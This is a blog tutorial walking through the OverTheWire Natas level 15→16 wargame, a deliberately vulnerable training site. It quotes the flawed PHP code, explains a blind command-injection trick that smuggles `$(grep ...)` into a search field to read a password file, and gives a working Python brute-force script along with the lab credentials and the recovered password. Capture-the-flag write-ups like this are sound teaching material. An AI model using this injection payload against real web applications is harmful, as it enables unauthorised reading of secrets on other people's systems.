---
layout: post-with-comments
title: "OverTheWire Natas Level 15 → 16 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-15-to-16/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, command-injection, blind]
description: "A step by step tutorial for OverTheWire Natas Level 15 → 16!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-14-to-15/' | relative_url }}">← Previous: Level 14 → 15</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas16.html" target="_blank" rel="noopener">
      Official (Level 16) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-16-to-17/' | relative_url }}">
      Next: Level 16 → 17 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas16.natas.labs.overthewire.org>  
Credentials: **natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**

```bash
# Using curl (optional):
curl -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo 
  http://natas16.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-15-to-16/homepage.jpg' | relative_url }})

---

## Task

The page lets us search inside a dictionary with **grep**, but the input is filtered.
Characters like `; | & \` ' "`are blocked — yet`\$ ( )\` are still allowed.

That means we can use **command substitution**: `$( <command> )`.

---

## A little bit of Theory

From the source:

```php
if(preg_match('/[;|&`\'"]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

* `passthru()` runs our input inside `grep`.
* By injecting `$(...)`, we can make grep’s pattern dynamic.
* Trick: use grep itself to test password prefixes from `/etc/natas_webpass/natas17`.

---

## Approach

We inject payloads like:

```
$(grep -E ^<prefix>.* /etc/natas_webpass/natas17)
```

* If `<prefix>` matches the start of the password → inner `grep` prints the password → outer `grep` finds **no matches** → page is short.
* If not → output is empty → outer `grep` searches the dictionary normally → page is long.

So by measuring **response length**, we can brute-force the password.

---

## Solution

### Step 1: Manual test

Try:

```
$(echo test)
```

You’ll see lots of dictionary matches containing “test”.

![probe]({{ '/assets/images/natas/level-15-to-16/probe.jpg' | relative_url }})

### Step 2: Automate with Python

```python
import requests, sys
from string import ascii_lowercase, ascii_uppercase, digits

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()
s.auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

password = ""
# adjust if your instance differs
TRUE_LEN = 1105

while len(password) < 32:
    for ch in charset:
        prefix = password + ch
        payload = {'needle': f'$(grep -E ^{prefix}.* /etc/natas_webpass/natas17)'}
        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

        if len(r.text) == TRUE_LEN:
            sys.stdout.write(ch)
            sys.stdout.flush()
            password += ch
            break
```

![script-run]({{ '/assets/images/natas/level-15-to-16/run.jpg' | relative_url }})

---

## Password

```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

---

**Troubleshooting**

* Getting only “illegal character”? → Make sure payload doesn’t contain blocked symbols.
* Wrong length? → Print `len(r.text)` for true/false cases and adjust `TRUE_LEN`.
* Script stuck? → Double-check `charset` and the path `/etc/natas_webpass/natas17`.

---

**Congrats 🎉** You’ve used a blind **command injection** oracle to recover the password for **natas17**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
